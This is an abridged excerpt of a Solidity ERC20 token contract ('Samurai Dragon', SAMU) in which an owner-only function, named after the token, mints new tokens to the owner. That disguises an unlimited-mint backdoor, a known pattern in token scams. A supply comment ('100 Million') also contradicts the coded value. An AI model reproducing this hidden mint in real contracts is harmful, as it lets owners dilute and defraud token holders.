...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function SAMU(uint256 amount) public onlyOwner {
    SAMU(msg.sender, amount);
    }
    ...
    function SAMU(address account, uint256 amount) internal virtual {
...
contract SAMU is ERC20 {
    ...
    uint tokenTotalSupply = 1000000000; // 100 Million Token SAMU SAMU
    
    constructor() public ERC20("Samurai Dragon", "SAMU") {
        SAMU(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}